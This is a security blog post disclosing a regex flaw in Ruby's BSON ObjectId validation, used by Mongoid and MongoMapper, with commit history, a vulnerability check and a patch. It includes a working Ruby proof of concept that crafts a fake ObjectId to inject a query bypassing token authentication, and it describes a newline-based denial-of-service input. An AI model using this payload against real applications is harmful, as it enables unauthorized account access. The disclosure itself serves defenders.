---
layout: post
title:  "Mongo BSON Injection: Ruby Regexps Strike Again"
author: "Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)"
---

TL;DR There's a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, <strong>but most likely to critical BSON Injection</strong> (similar to SQL injection) - depends on gem versions you use.

3 years ago <a href="https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html">I wrote a blog post</a> about broken regular expressions in Ruby, `^$` meaning new lines `\n`. Back then I was only able to demonstrate XSS on Github and other websites using "javascript:a()\nhttps://". I had a feeling there are much worse use cases of this vulnerability and here it is.

## Briefly About Gems

BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”. 

Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.

Moped gem is A MongoDB driver for Ruby.

So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.

Most likely you're using Mongoid or Mongo Mapper, but technically the vulnerability is in `legal?` of BSON::ObjectId.

## A Tale of One Regression

`legal?` was created in Moped::BSON on Jan 23, 2012. It intended to verify the _id from user input is hexdecimal and is exactly 24 symbols. It looked like this:

{%highlight ruby%}
def legal?(str)
  !!str.match(/^[0-9a-f]{24}$/i)
end
{%endhighlight%}

But this nasty `^$`-using Ruby code didn't survive long - <a href="https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24">on Apr 17, 2012 it was silently replaced</a> with proper `!!str.match(/\A\h{24}\Z/i)`

However, on March 31, 2013 Moped deleted internal BSON module and <a href="https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6">switched to separate BSON gem</a>

![](/img/moped.png)

The `legal?` method successfully <a href="https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191">migrated to mongodb/bson-ruby</a> before that (on March 3). 

But on Apr 7 <a href="https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219">an interesting commit happens</a>. @durran (the maintainer of all those repos), replaces `/\A\h{24}\Z/ === string.to_s` with vulnerable `string.to_s =~ /^[0-9a-f]{24}$/i ? true : false`.

So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.

## Am I Vulnerable?

I see, you're getting bored. Run this code to see if you're vulnerable:

{%highlight ruby%}
b=((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId)
raise "DoS!" if b.legal? "a"*24+"\n"
raise "Injection!" if b.legal? "a"*24+"\na"
{%endhighlight%}

And use this patch if you indeed are! Don't forget to alert others.

{%highlight ruby%}
def ((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId).legal?(s)
  /\A\h{24}\z/ === s.to_s
end
{%endhighlight%}

## The Vulnerability

If you're lucky enough and use old version of Moped, only light version of DoS is possible. 

Wait, did I mention another reason why Regexps in Ruby are horribly designed? There's \A meaning the beginning and there's \Z meaning the ending... or a new line. You're supposed to know it. Because only \z means the ending. But most people don't care the last `\n`.

![](/img/moped2.png)

So if you send something like `aaaaaaaaaaaaaaaaaaaaaaaa%0A` (with trailing `\n`), the `legal?` method will still return `true` because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with `[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')`. 

Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.

But if you're using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like _id=`Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data`. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!

{%highlight ruby%}
require 'uri'
b = BSON::Document.new
b["$query"] = {"token" => {"$gt"=>""}}

payload = b.to_bson[4..-2]
id_ish = ("\n\n" + "a"*24 + "\n\n")

fake_id = "a"*24 +
  "\x02_id\0".unpack('H*')[0] +
  [id_ish.size/2 + 1].pack('V').unpack('H*')[0] + id_ish + "00" +
  payload.unpack('H*')[0]

puts URI.encode(fake_id) # looks like:
# aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000

User.find fake_id #returns <User _id: 556f840f686f6d6746000000, token: "a">
{%endhighlight%}

Thanks to <a href="https://twitter.com/judofyr">@judofyr</a> for the help with this PoC!

ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it's supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.

\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00
mng_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a_id<strong>\x00
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x02_id\x00\x0F\x00\x00\x00\xAA
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x00\x03$query\x00\e\x00\x00
\x00\x03token\x00\x0F\x00\x00\x00\x02$gt\x00\x01</strong>\x00\x00\x00\x00\x00\x00\x00

Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.